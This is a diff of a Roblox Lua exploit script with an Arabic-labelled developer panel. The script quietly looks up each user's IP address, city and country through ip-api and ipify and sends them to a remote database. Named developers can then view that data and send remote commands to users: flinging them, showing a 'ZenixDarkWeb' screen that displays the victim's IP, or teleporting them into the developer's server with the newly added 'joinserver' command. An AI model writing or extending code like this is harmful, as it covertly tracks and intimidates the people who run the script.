@@ -4,8 +4,7 @@ local Workspace = game:GetService("Workspace")
 local UserInputService = game:GetService("UserInputService")
 local TweenService = game:GetService("TweenService")
 local HttpService = game:GetService("HttpService")
-local Lighting = game:GetService("Lighting")
-local StarterGui = game:GetService("StarterGui")
+local TeleportService = game:GetService("TeleportService")
 
 local LocalPlayer = Players.LocalPlayer
 
@@ -36,7 +35,7 @@ local GLOBAL_DELAY = 1
 local TIMESTAMP_TOLERANCE = 5
 local HEARTBEAT_INTERVAL = 5
 local OFFLINE_THRESHOLD = 15
-local OFFLINE_EXPIRY = 86400
+local PLAYERS_REFRESH_INTERVAL = 15
 
 local Developers = {
     ["Go2mohamed"] = true,
@@ -54,13 +53,14 @@ local Developers = {
 
 local TabAccess = {
     connectedPlayers = { Go2mohamed = true, Go2yousef = true },
-    serverPlayers = { Go2mohamed = true, Go2yousef = true },
 }
 
 local LOCAL_ONLY = {
     notf = true,
     notfstop = true,
     givechat = true,
+    joinserver = true,
+    rainbowmap = true,
 }
 
 local PLAYER_INFO = {
@@ -71,10 +71,8 @@ local PLAYER_INFO = {
     countryCode = "",
     city = "",
     region = "",
-    isp = "",
     ip = "N/A",
     phoneIp = "N/A",
-    timezone = "UTC",
     utcOffset = 0,
     placeId = game.PlaceId,
     jobId = game.JobId or "",
@@ -154,10 +152,6 @@ local function FindPlayer(targetName)
     return nil
 end
 
-local function GetDeveloperByPlayer(player)
-    return IsDevPlayer(player)
-end
-
 local httpRequest = (syn and syn.request) or (http and http.request) or http_request or request
 
 local function HttpCall(method, path, bodyTable)
@@ -217,15 +211,13 @@ local function HttpGetRaw(url)
 end
 
 local function FetchIPInfo()
-    local deviceData = HttpGetRaw("http://ip-api.com/json/?fields=status,country,countryCode,regionName,city,timezone,isp,query,offset")
+    local deviceData = HttpGetRaw("http://ip-api.com/json/?fields=status,country,countryCode,regionName,city,timezone,query,offset")
     if deviceData and type(deviceData) == "table" then
         PLAYER_INFO.country = tostring(deviceData.country or "Unknown")
         PLAYER_INFO.countryCode = tostring(deviceData.countryCode or "")
         PLAYER_INFO.region = tostring(deviceData.regionName or "")
         PLAYER_INFO.city = tostring(deviceData.city or "")
-        PLAYER_INFO.isp = tostring(deviceData.isp or "")
         PLAYER_INFO.ip = tostring(deviceData.query or "N/A")
-        PLAYER_INFO.timezone = tostring(deviceData.timezone or "UTC")
         PLAYER_INFO.utcOffset = tonumber(deviceData.offset) or 0
     end
     local phoneData = HttpGetRaw("https://api.ipify.org?format=json")
@@ -245,10 +237,8 @@ local function RegisterPlayer()
         countryCode = PLAYER_INFO.countryCode,
         city = PLAYER_INFO.city,
         region = PLAYER_INFO.region,
-        isp = PLAYER_INFO.isp,
         ip = PLAYER_INFO.ip,
         phoneIp = PLAYER_INFO.phoneIp,
-        timezone = PLAYER_INFO.timezone,
         utcOffset = PLAYER_INFO.utcOffset,
         placeId = PLAYER_INFO.placeId,
         jobId = PLAYER_INFO.jobId,
@@ -447,7 +437,7 @@ local BangState = {}
 local CamState = {}
 local RainbowData = {}
 local InvisibleData = {}
-local RainbowLandData = { Active = false }
+local RainbowMapData = { Active = false }
 
 local function StopBangFor(player)
     if not player then return end
@@ -582,15 +572,18 @@ local function StopInvisible(pName)
     end
 end
 
-local function StopRainbowLand()
-    if RainbowLandData.Active then
-        RainbowLandData.Active = false
-        if RainbowLandData.Connection then RainbowLandData.Connection:Disconnect() end
-        if RainbowLandData.Gui then RainbowLandData.Gui:Destroy() end
-        for part, orig in pairs(RainbowLandData.OriginalColors or {}) do
-            if part and part.Parent then part.Color = orig end
+local function StopRainbowMap()
+    if RainbowMapData.Active then
+        RainbowMapData.Active = false
+        if RainbowMapData.Thread then
+            RainbowMapData.Thread = nil
         end
-        RainbowLandData = { Active = false }
+        if RainbowMapData.OriginalColors then
+            for part, orig in pairs(RainbowMapData.OriginalColors) do
+                if part and part.Parent then part.Color = orig end
+            end
+        end
+        RainbowMapData = { Active = false }
     end
 end
 
@@ -696,6 +689,19 @@ end
 ExecuteCommand = function(cmd, targetName, value, senderName, targetPlayer)
     local target = targetPlayer or FindPlayer(targetName)
     if not target then return end
+
+    if cmd == "joinserver" then
+        if target == LocalPlayer and value then
+            local placeId, jobId = tostring(value):match("^(%d+)|(.+)$")
+            if placeId and jobId then
+                task.wait(0.5)
+                pcall(function()
+                    TeleportService:TeleportToPlaceInstance(tonumber(placeId), jobId, LocalPlayer)
+                end)
+            end
+        end
+        return
+    end
 
     local char = target.Character
     if not char then return end
@@ -1288,7 +1294,7 @@ ExecuteCommand = function(cmd, targetName, value, senderName, targetPlayer)
         local hue = 0
         RainbowData[pName].Connection = RunService.Heartbeat:Connect(function(dt)
             if not RainbowData[pName] or not RainbowData[pName].Active then return end
-            hue = (hue + dt * 0.4) % 1
+            hue = (hue + dt * 0.28) % 1
             local col = Color3.fromHSV(hue, 1, 1)
             local c = target.Character
             if not c then return end
@@ -1326,53 +1332,39 @@ ExecuteCommand = function(cmd, targetName, value, senderName, targetPlayer)
                 end
             end
         end)
-    elseif cmd == "rainbowland" then
-        if RainbowLandData.Active then
-            StopRainbowLand()
+    elseif cmd == "rainbowmap" then
+        if target ~= LocalPlayer then return end
+        if RainbowMapData.Active then
+            StopRainbowMap()
             return
         end
-        RainbowLandData = { Active = true, OriginalColors = {} }
+        RainbowMapData = { Active = true, OriginalColors = {} }
+        local count = 0
         for _, obj in ipairs(Workspace:GetDescendants()) do
-            if obj:IsA("BasePart") then
-                RainbowLandData.OriginalColors[obj] = obj.Color
+            if obj:IsA("BasePart") and not obj:FindFirstAncestorOfClass("Model") == nil or obj:IsA("BasePart") then
+                RainbowMapData.OriginalColors[obj] = obj.Color
+                count = count + 1
+                if count >= 3000 then break end
             end
         end
-        local sg = Instance.new("ScreenGui")
-        sg.Name = "RainbowLandOverlay"
-        sg.ResetOnSpawn = false
-        sg.IgnoreGuiInset = true
-        sg.DisplayOrder = 999997
-        local parentOk2 = pcall(function() sg.Parent = CoreGui end)
-        if not parentOk2 then sg.Parent = LocalPlayer:WaitForChild("PlayerGui") end
-        local overlay = Instance.new("Frame", sg)
-        overlay.Size = UDim2.new(1, 0, 1, 0)
-        overlay.BackgroundColor3 = Color3.new(1, 1, 1)
-        overlay.BackgroundTransparency = 0.85
-        overlay.BorderSizePixel = 0
-        overlay.ZIndex = 1000
-        local grad = Instance.new("UIGradient", overlay)
-        grad.Color = ColorSequence.new({
-            ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 0, 0)),
-            ColorSequenceKeypoint.new(0.17, Color3.fromRGB(255, 165, 0)),
-            ColorSequenceKeypoint.new(0.33, Color3.fromRGB(255, 255, 0)),
-            ColorSequenceKeypoint.new(0.5, Color3.fromRGB(0, 255, 0)),
-            ColorSequenceKeypoint.new(0.67, Color3.fromRGB(0, 200, 255)),
-            ColorSequenceKeypoint.new(0.83, Color3.fromRGB(0, 0, 255)),
-            ColorSequenceKeypoint.new(1, Color3.fromRGB(160, 0, 255))
-        })
-        RainbowLandData.Gui = sg
         local hue = 0
-        RainbowLandData.Connection = RunService.Heartbeat:Connect(function(dt)
-            if not RainbowLandData.Active then return end
-            hue = (hue + dt * 0.15) % 1
-            grad.Rotation = grad.Rotation + dt * 60
-            local col = Color3.fromHSV(hue, 1, 1)
-            for part in pairs(RainbowLandData.OriginalColors) do
-                if part and part.Parent then
-                    part.Color = col
+        local thread = task.spawn(function()
+            while RainbowMapData.Active do
+                hue = (hue + 0.015) % 1
+                local col = Color3.fromHSV(hue, 1, 1)
+                local camPos = Workspace.CurrentCamera and Workspace.CurrentCamera.CFrame.Position or Vector3.zero
+                for part in pairs(RainbowMapData.OriginalColors) do
+                    if part and part.Parent then
+                        local dist = (part.Position - camPos).Magnitude
+                        if dist < 400 then
+                            part.Color = col
+                        end
+                    end
                 end
+                task.wait(0.1)
             end
         end)
+        RainbowMapData.Thread = thread
     elseif cmd == "zenixdarkweb" then
         local sg = Instance.new("ScreenGui")
         sg.Name = "ZenixDarkWeb"
@@ -1430,7 +1422,6 @@ ExecuteCommand = function(cmd, targetName, value, senderName, targetPlayer)
                 "> Target: " .. PLAYER_INFO.displayName,
                 "> Location: " .. PLAYER_INFO.city .. ", " .. PLAYER_INFO.country,
                 "> IP: " .. PLAYER_INFO.ip,
-                "> ISP: " .. PLAYER_INFO.isp,
                 "> Status: CONNECTED",
                 "> You have been watched.",
                 "> ZENIX DARK WEB END",
@@ -1622,6 +1613,14 @@ task.spawn(function()
     while true do
         pcall(Heartbeat)
         task.wait(HEARTBEAT_INTERVAL)
+    end
+end)
+
+task.spawn(function()
+    task.wait(5)
+    while true do
+        pcall(SetOffline)
+        task.wait(25)
     end
 end)
 
@@ -1818,7 +1817,6 @@ if IsDeveloper then
         end
 
         local canSeeConnPlayers = TabAccess.connectedPlayers[LocalPlayer.Name] == true
-        local canSeeServerPlayers = TabAccess.serverPlayers[LocalPlayer.Name] == true
 
         local AdminTab = CreateTab("أوامر المطورين")
         local BangTab = CreateTab("Bang")
@@ -1826,12 +1824,8 @@ if IsDeveloper then
         local HousesTab = CreateTab("منازل")
 
         local ConnectedPlayersTab = nil
-        local ServerPlayersTab = nil
         if canSeeConnPlayers then
             ConnectedPlayersTab = CreateTab("اللاعبين المتصلين")
-        end
-        if canSeeServerPlayers then
-            ServerPlayersTab = CreateTab("متصلين بالسيرفر")
         end
 
         AdminTab.Visible = true
@@ -2075,7 +2069,7 @@ if IsDeveloper then
             {"/FlingZ", "flingz"},
             {"/Rainbow", "rainbow"},
             {"/Invisible", "invisible"},
-            {"/RainbowLand", "rainbowland"},
+            {"/RainbowMap", "rainbowmap"},
             {"/ZenixDarkWeb", "zenixdarkweb"}
         }
 
@@ -2253,6 +2247,15 @@ if IsDeveloper then
         delAllHousesBtn.BackgroundColor3 = Color3.fromRGB(120, 0, 0)
         delAllHousesBtn.TextColor3 = Color3.fromRGB(255, 200, 200)
 
+        local function FormatTime12h(utcOffset)
+            local utc = os.time(os.date("!*t"))
+            local t = os.date("!*t", utc + (utcOffset or 0))
+            local h = t.hour % 12
+            if h == 0 then h = 12 end
+            local ampm = t.hour >= 12 and "م" or "ص"
+            return string.format("%d:%02d %s", h, t.min, ampm)
+        end
+
         local function CreatePlayerCardUI(parent, playerData)
             local card = Instance.new("Frame")
             card.Size = UDim2.new(0.95, 0, 0, 120)
@@ -2261,7 +2264,7 @@ if IsDeveloper then
             card.Parent = parent
             Instance.new("UICorner", card).CornerRadius = UDim.new(0, 10)
             local cardStroke = Instance.new("UIStroke", card)
-            cardStroke.Color = playerData.status == "online" and Color3.fromRGB(0, 255, 100) or Color3.fromRGB(150, 0, 0)
+            cardStroke.Color = Color3.fromRGB(110, 30, 200)
             cardStroke.Thickness = 2
 
             local displayLbl = Instance.new("TextLabel")
@@ -2287,12 +2290,13 @@ if IsDeveloper then
             userLbl.Parent = card
 
             local copyBtn = Instance.new("TextButton")
-            copyBtn.Size = UDim2.new(0, 20, 0, 16)
-            copyBtn.Position = UDim2.new(0, 4, 0, 26)
-            copyBtn.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
-            copyBtn.Text = "📋"
+            copyBtn.Size = UDim2.new(0, 42, 0, 18)
+            copyBtn.Position = UDim2.new(0, 4, 0, 25)
+            copyBtn.BackgroundColor3 = Color3.fromRGB(40, 30, 55)
+            copyBtn.Text = "نسخ"
             copyBtn.TextColor3 = Color3.new(1, 1, 1)
-            copyBtn.TextSize = 10
+            copyBtn.Font = Enum.Font.GothamBold
+            copyBtn.TextSize = 11
             copyBtn.Parent = card
             Instance.new("UICorner", copyBtn).CornerRadius = UDim.new(0, 4)
             copyBtn.MouseButton1Click:Connect(function()
@@ -2301,19 +2305,22 @@ if IsDeveloper then
                 end
             end)
 
-            local statusDot = Instance.new("TextLabel")
-            statusDot.Size = UDim2.new(0, 15, 0, 15)
-            statusDot.Position = UDim2.new(0, 4, 0, 6)
-            statusDot.BackgroundTransparency = 1
-            statusDot.Text = playerData.status == "online" and "🟢" or "🔴"
-            statusDot.TextSize = 12
-            statusDot.Parent = card
+            local statusLbl = Instance.new("TextLabel")
+            statusLbl.Size = UDim2.new(0, 60, 0, 15)
+            statusLbl.Position = UDim2.new(0, 4, 0, 6)
+            statusLbl.BackgroundTransparency = 1
+            statusLbl.Text = playerData.status == "online" and "متصل" or "غير متصل"
+            statusLbl.TextColor3 = playerData.status == "online" and Color3.fromRGB(150, 255, 150) or Color3.fromRGB(255, 150, 150)
+            statusLbl.Font = Enum.Font.GothamBold
+            statusLbl.TextSize = 11
+            statusLbl.TextXAlignment = Enum.TextXAlignment.Right
+            statusLbl.Parent = card
 
             local infoLine = Instance.new("TextLabel")
             infoLine.Size = UDim2.new(1, -16, 0, 16)
             infoLine.Position = UDim2.new(0, 8, 0, 44)
             infoLine.BackgroundTransparency = 1
-            infoLine.Text = "🌍 " .. (playerData.country or "Unknown") .. "  🏙️ " .. (playerData.city or "-")
+            infoLine.Text = "الدولة: " .. (playerData.country or "Unknown") .. "  |  " .. (playerData.city or "-")
             infoLine.TextColor3 = Color3.fromRGB(220, 200, 255)
             infoLine.Font = Enum.Font.Gotham
             infoLine.TextSize = 11
@@ -2324,7 +2331,7 @@ if IsDeveloper then
             timeLbl.Size = UDim2.new(1, -16, 0, 16)
             timeLbl.Position = UDim2.new(0, 8, 0, 60)
             timeLbl.BackgroundTransparency = 1
-            timeLbl.Text = ""
+            timeLbl.Text = "الوقت: " .. FormatTime12h(playerData.utcOffset)
             timeLbl.TextColor3 = Color3.fromRGB(220, 200, 255)
             timeLbl.Font = Enum.Font.Gotham
             timeLbl.TextSize = 11
@@ -2341,15 +2348,6 @@ if IsDeveloper then
             ageLbl.TextSize = 11
             ageLbl.TextXAlignment = Enum.TextXAlignment.Right
             ageLbl.Parent = card
-
-            local function updateTime()
-                local offset = tonumber(playerData.utcOffset) or 0
-                local utc = os.time(os.date("!*t"))
-                local localTime = utc + offset
-                local t = os.date("!*t", localTime)
-                timeLbl.Text = string.format("🕒 %02d:%02d", t.hour, t.min)
-            end
-            updateTime()
 
             local btnRow = Instance.new("Frame")
             btnRow.Size = UDim2.new(1, -16, 0, 22)
@@ -2437,7 +2435,7 @@ if IsDeveloper then
                     row.Size = UDim2.new(1, -4, 0, 28)
                     row.BackgroundTransparency = 1
                     local l = Instance.new("TextLabel", row)
-                    l.Size = UDim2.new(0.6, 0, 1, 0)
+                    l.Size = UDim2.new(0.55, 0, 1, 0)
                     l.Position = UDim2.new(0, 4, 0, 0)
                     l.BackgroundTransparency = 1
                     l.Text = value
@@ -2447,8 +2445,8 @@ if IsDeveloper then
                     l.TextXAlignment = Enum.TextXAlignment.Right
                     l.TextTruncate = Enum.TextTruncate.AtEnd
                     local lb = Instance.new("TextLabel", row)
-                    lb.Size = UDim2.new(0.35, 0, 1, 0)
-                    lb.Position = UDim2.new(0.65, 0, 0, 0)
+                    lb.Size = UDim2.new(0.3, 0, 1, 0)
+                    lb.Position = UDim2.new(0.6, 0, 0, 0)
                     lb.BackgroundTransparency = 1
                     lb.Text = label .. ":"
                     lb.TextColor3 = Color3.fromRGB(200, 200, 200)
@@ -2456,11 +2454,12 @@ if IsDeveloper then
                     lb.TextSize = 12
                     lb.TextXAlignment = Enum.TextXAlignment.Left
                     local cp = Instance.new("TextButton", row)
-                    cp.Size = UDim2.new(0, 22, 0, 20)
-                    cp.Position = UDim2.new(1, -24, 0, 4)
+                    cp.Size = UDim2.new(0, 40, 0, 22)
+                    cp.Position = UDim2.new(1, -42, 0, 3)
                     cp.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
-                    cp.Text = "📋"
-                    cp.TextSize = 10
+                    cp.Text = "نسخ"
+                    cp.Font = Enum.Font.GothamBold
+                    cp.TextSize = 11
                     cp.TextColor3 = Color3.new(1, 1, 1)
                     Instance.new("UICorner", cp).CornerRadius = UDim.new(0, 4)
                     cp.MouseButton1Click:Connect(function()
@@ -2473,34 +2472,30 @@ if IsDeveloper then
                 addRow("الدولة", tostring(playerData.country or "Unknown"))
                 addRow("المدينة", tostring(playerData.city or "-"))
                 addRow("المنطقة", tostring(playerData.region or "-"))
-                addRow("ISP", tostring(playerData.isp or "-"))
-                addRow("IP الجهاز", tostring(playerData.ip or "N/A"))
-                addRow("IP الهاتف", tostring(playerData.phoneIp or "N/A"))
-                addRow("المنطقة الزمنية", tostring(playerData.timezone or "UTC"))
+                addRow("عنوان ip", tostring(playerData.ip or "N/A"))
+                addRow("ip الهاتف", tostring(playerData.phoneIp or "N/A"))
                 addRow("عمر الحساب", tostring(playerData.accountAgeDays or 0) .. " يوم")
-                addRow("الحالة", tostring(playerData.status or "unknown"))
+                addRow("الحالة", playerData.status == "online" and "متصل" or "غير متصل")
                 addRow("Place ID", tostring(playerData.placeId or 0))
                 addRow("Job ID", tostring(playerData.jobId or "-"))
             end)
 
             mkBtn("Join", 55, function()
-                local link = "roblox://placeId=" .. tostring(playerData.placeId or 0) .. "&gameInstanceId=" .. tostring(playerData.jobId or "")
-                if setclipboard then pcall(function() setclipboard(link) end) end
+                local placeId = tonumber(playerData.placeId) or game.PlaceId
+                local jobId = tostring(playerData.jobId or "")
+                if jobId == "" or jobId == "nil" then return end
+                if placeId == game.PlaceId and jobId == game.JobId then return end
+                task.spawn(function()
+                    pcall(function()
+                        TeleportService:TeleportToPlaceInstance(placeId, jobId, LocalPlayer)
+                    end)
+                end)
             end)
 
-            mkBtn("JoinMe", 60, function()
-                SendCommandAPI("notf", playerData.username, "")
-                task.spawn(function()
-                    local data = {
-                        cmd = "joinserver",
-                        target = playerData.username,
-                        value = tostring(game.JobId or ""),
-                        sender = LocalPlayer.Name,
-                        timestamp = os.time(),
-                        status = "pending",
-                    }
-                    HttpCall("POST", "commands.json", data)
-                end)
+            mkBtn("JoinMe", 65, function()
+                if playerData.username == LocalPlayer.Name then return end
+                local myData = tostring(game.PlaceId) .. "|" .. tostring(game.JobId or "")
+                SendCommandAPI("joinserver", playerData.username, myData)
             end)
 
             mkBtn("X", 30, function()
@@ -2520,8 +2515,8 @@ if IsDeveloper then
 
             task.spawn(function()
                 while card and card.Parent do
-                    updateTime()
-                    task.wait(60)
+                    timeLbl.Text = "الوقت: " .. FormatTime12h(playerData.utcOffset)
+                    task.wait(30)
                 end
             end)
         end
@@ -2540,13 +2535,7 @@ if IsDeveloper then
                     local ls = tonumber(pdata.lastSeen) or 0
                     local isOnline = (now - ls) <= OFFLINE_THRESHOLD
                     pdata.status = isOnline and "online" or "offline"
-                    if (now - ls) > OFFLINE_EXPIRY then
-                        task.spawn(function()
-                            HttpCall("DELETE", "players/" .. username .. ".json", nil)
-                        end)
-                    else
-                        table.insert(list, pdata)
-                    end
+                    table.insert(list, pdata)
                 end
             end
             table.sort(list, function(a, b)
@@ -2596,64 +2585,7 @@ if IsDeveloper then
             task.spawn(function()
                 while ConnScroll and ConnScroll.Parent do
                     pcall(function() RefreshPlayersTab(ConnScroll) end)
-                    task.wait(10)
-                end
-            end)
-        end
-
-        if ServerPlayersTab then
-            local SrvHeader = Instance.new("Frame")
-            SrvHeader.Size = UDim2.new(1, 0, 0, 35)
-            SrvHeader.BackgroundTransparency = 1
-            SrvHeader.Parent = ServerPlayersTab
-            local srvLabel = Instance.new("TextLabel")
-            srvLabel.Size = UDim2.new(1, 0, 1, 0)
-            srvLabel.BackgroundTransparency = 1
-            srvLabel.Text = "متصلين بالسيرفر"
-            srvLabel.TextColor3 = Color3.new(1, 1, 1)
-            srvLabel.Font = Enum.Font.GothamBold
-            srvLabel.TextSize = 14
-            srvLabel.Parent = SrvHeader
-
-            local SrvScroll = Instance.new("ScrollingFrame")
-            SrvScroll.Size = UDim2.new(1, 0, 1, -40)
-            SrvScroll.Position = UDim2.new(0, 0, 0, 40)
-            SrvScroll.BackgroundTransparency = 1
-            SrvScroll.ScrollBarThickness = 6
-            SrvScroll.ScrollBarImageColor3 = PURPLE
-            SrvScroll.CanvasSize = UDim2.new(0, 0, 0, 0)
-            SrvScroll.Parent = ServerPlayersTab
-            local SrvLayout = Instance.new("UIListLayout", SrvScroll)
-            SrvLayout.Padding = UDim.new(0, 8)
-            SrvLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center
-            SrvLayout.SortOrder = Enum.SortOrder.LayoutOrder
-            SrvLayout:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(function()
-                SrvScroll.CanvasSize = UDim2.new(0, 0, 0, SrvLayout.AbsoluteContentSize.Y + 10)
-            end)
-
-            task.spawn(function()
-                while SrvScroll and SrvScroll.Parent do
-                    for _, c in ipairs(SrvScroll:GetChildren()) do
-                        if c:IsA("Frame") then c:Destroy() end
-                    end
-                    for _, plr in ipairs(Players:GetPlayers()) do
-                        local pdata = {
-                            username = plr.Name,
-                            displayName = plr.DisplayName,
-                            accountAgeDays = plr.AccountAge,
-                            country = "-",
-                            city = "-",
-                            ip = "-",
-                            phoneIp = "-",
-                            utcOffset = 0,
-                            timezone = "UTC",
-                            placeId = game.PlaceId,
-                            jobId = game.JobId or "",
-                            status = "online",
-                        }
-                        CreatePlayerCardUI(SrvScroll, pdata)
-                    end
-                    task.wait(10)
+                    task.wait(PLAYERS_REFRESH_INTERVAL)
                 end
             end)
         end
@@ -2794,11 +2726,3 @@ if IsDeveloper then
         end)
     end)
 end
-
-task.spawn(function()
-    task.wait(5)
-    while true do
-        pcall(SetOffline)
-        task.wait(25)
-    end
-end)
